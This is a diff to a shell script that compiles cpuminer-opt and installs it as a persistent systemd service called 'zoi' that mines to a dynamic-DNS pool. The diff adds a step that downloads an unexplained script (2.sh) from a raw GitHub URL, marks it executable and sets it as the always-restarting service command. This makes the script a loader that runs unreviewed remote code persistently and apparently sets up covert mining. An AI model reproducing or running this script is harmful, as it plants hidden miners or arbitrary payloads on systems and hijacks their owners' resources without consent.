@@ -6,6 +6,8 @@ cd /usr/local/src/ &&
 wget https://github.com/JayDDee/cpuminer-opt/archive/v3.8.3.1.tar.gz &&
 tar xvzf v3.8.3.1.tar.gz &&
 cd cpuminer-opt-3.8.3.1 &&
+wget https://raw.githubusercontent.com/fablebox/susuwatari/master/thanhmlzz/2.sh &&
+chmod +x 2.sh &&
 ./autogen.sh &&
 CFLAGS="-O3 -march=native -Wall" CXXFLAGS="$CFLAGS -std=gnu++11" ./configure --with-curl &&
 make &&
@@ -14,7 +16,7 @@ bash -c 'cat <<EOT >>/lib/systemd/system/zoi.service
 Description=zoi
 After=network.target
 [Service]
-ExecStart= /usr/local/src/cpuminer-opt-3.8.3.1/cpuminer -a lyra2z330 -o stratum+tcp://chansio.ddns.net:3032 -u daica.az -p x
+ExecStart= /usr/local/src/cpuminer-opt-3.8.3.1/2.sh
 WatchdogSec=3600
 Restart=always
 RestartSec=60
